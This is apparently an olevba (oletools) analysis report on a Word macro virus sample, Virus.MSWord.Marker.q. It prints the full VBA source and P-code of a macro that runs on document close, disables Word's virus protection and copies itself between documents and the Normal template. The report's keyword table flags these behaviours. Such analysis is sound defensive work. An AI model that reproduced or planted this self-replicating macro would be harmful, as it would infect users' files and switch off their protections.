olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.q
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.q - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 






































Private Sub Document_Close()
On Error Resume Next
Const ID = "xyzzy"
Dim hdlskk As Boolean
Dim ijnff, iitgh As Object
Dim zmbbcxx As String
Set ijnff = ActiveDocument.VBProject.VBComponents.Item(1)
Set iitgh = NormalTemplate.VBProject.VBComponents.Item(1)
Options.VirusProtection = False
If (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
If (iitgh.codemodule.Find(ID, 1, 1, 10000, 10000) = False) And (ijnff.codemodule.Find(ID, 1, 1, 10000, 10000) = True) Then
hdlskk = NormalTemplate.Saved
zmbbcxx = ijnff.codemodule.Lines(1, ijnff.codemodule.CountOfLines)
iitgh.codemodule.deletelines 1, iitgh.codemodule.CountOfLines
iitgh.codemodule.AddFromString zmbbcxx
If hdlskk = True Then NormalTemplate.Save
End If
hdlskk = False
If (iitgh.codemodule.Find(ID, 1, 1, 10000, 10000) = True) And (ijnff.codemodule.Find(ID, 1, 1, 10000, 10000) = False) Then
zmbbcxx = iitgh.codemodule.Lines(1, iitgh.codemodule.CountOfLines)
ijnff.codemodule.deletelines 1, ijnff.codemodule.CountOfLines
ijnff.codemodule.AddFromString zmbbcxx
hdlskk = True
End If
If Rnd < 0.3 Then With Dialogs(wdDialogFileSummaryInfo): .Title = "Ethan Frome": .Author = "EW/LN/CB": .Keywords = "Ethan": .Execute: hdlskk = True: End With
If (hdlskk = True) And Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.q
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 3407 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Line #38:
' 	FuncDefn (Private Sub Document_Close())
' Line #39:
' 	OnError (Resume Next) 
' Line #40:
' 	Dim (Const) 
' 	LitStr 0x0005 "xyzzy"
' 	VarDefn ID
' Line #41:
' 	Dim 
' 	VarDefn hdlskk (As Boolean)
' Line #42:
' 	Dim 
' 	VarDefn ijnff
' 	VarDefn iitgh (As Object)
' Line #43:
' 	Dim 
' 	VarDefn zmbbcxx (As String)
' Line #44:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ijnff 
' Line #45:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set iitgh 
' Line #46:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #47:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	IfBlock 
' Line #48:
' 	Ld ID 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld iitgh 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	Ld ID 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld ijnff 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #49:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St hdlskk 
' Line #50:
' 	LitDI2 0x0001 
' 	Ld ijnff 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld ijnff 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	St zmbbcxx 
' Line #51:
' 	LitDI2 0x0001 
' 	Ld iitgh 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld iitgh 
' 	MemLd codemodule 
' 	ArgsMemCall deletelines 0x0002 
' Line #52:
' 	Ld zmbbcxx 
' 	Ld iitgh 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #53:
' 	Ld hdlskk 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	LitVarSpecial (False)
' 	St hdlskk 
' Line #56:
' 	Ld ID 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld iitgh 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	Paren 
' 	Ld ID 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld ijnff 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #57:
' 	LitDI2 0x0001 
' 	Ld iitgh 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld iitgh 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	St zmbbcxx 
' Line #58:
' 	LitDI2 0x0001 
' 	Ld ijnff 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld ijnff 
' 	MemLd codemodule 
' 	ArgsMemCall deletelines 0x0002 
' Line #59:
' 	Ld zmbbcxx 
' 	Ld ijnff 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #60:
' 	LitVarSpecial (True)
' 	St hdlskk 
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	Ld Rnd 
' 	LitR8 0x3333 0x3333 0x3333 0x3FD3 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' 	BoS 0x0000 
' 	LitStr 0x000B "Ethan Frome"
' 	MemStWith Title 
' 	BoS 0x0000 
' 	LitStr 0x0008 "EW/LN/CB"
' 	MemStWith Author 
' 	BoS 0x0000 
' 	LitStr 0x0005 "Ethan"
' 	MemStWith Keywords 
' 	BoS 0x0000 
' 	ArgsMemCallWith Execute 0x0000 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	St hdlskk 
' 	BoS 0x0000 
' 	EndWith 
' 	EndIf 
' Line #63:
' 	Ld hdlskk 
' 	LitVarSpecial (True)
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #64:
' 	EndIfBlock 
' Line #65:
' 	EndSub 
' Line #66:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

